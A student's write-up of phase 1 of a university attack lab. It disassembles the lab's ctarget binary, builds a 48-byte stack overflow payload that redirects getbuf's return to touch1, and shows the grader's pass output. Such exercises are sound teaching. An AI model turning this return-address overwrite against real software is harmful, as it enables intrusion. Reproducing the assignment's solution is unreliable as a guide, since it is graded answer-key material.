# MY ATTACK LAB REPORT

See the `attacklab.pdf` file to understand what am I talking here about.

## PHASE 1

The first thing i need to do is to get the disassembled version of `ctarget`.

```bash
attack-lab / % objdump -D ctarget > ctarget_dump.txt
```

Have a look at the dump of `getbuf` function:
```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

You see, that it allocates 0x28 (i.e. 40 in decimal) bytes on the stack and calls `gets`. The main idea is to rewrite the return address of this function from `test` function to `touch1` function. It is pretty easy since the `Gets` function does not check the range of the buffer (I don't really know this because I have not checked it, but it seems obvious) and the function `getbuf` does not have any vulnerability protections such as ASLR or stack canaries. So let's just figure out the `touch1` function address and make a string that will inject the address of the function to the place we need. The beginning of the string we are injecting must be located at the 0x29 address and consist of 8 characters. So, we need to input 40 random characters (let it be `'?'` character idk) and 8 characters of the string we are injecting. The total length of the result string is 48 characters (and hence 48 bytes).

The address of `touch1` function first instruction is `00000000004017c0`. Since this executable is compiled on the little-endian machine, we need to give the `hex2raw` utility the string of `c0 17 40 00 00 00 00 00`.

So, let's write in `solutions/phase1/phase1_bytes.txt` the hex version of our string.
```
3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f c0 17 40 00 00 00 00 00
```
Then, let's convert this byte sequence into a raw string using the `hex2raw` utility and execute the program:
```bash
attack-lab / % ./hex2raw < solutions/phase1/phase1_bytes.txt > solutions/phase1/phase1_raw.txt
attack-lab / % ./ctarget -q -i solutions/phase1/phase1_raw.txt
```

We got this output:
```
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F C0 17 40 00 00 00 00 00
```
It means, that phase 1 is solved correctly.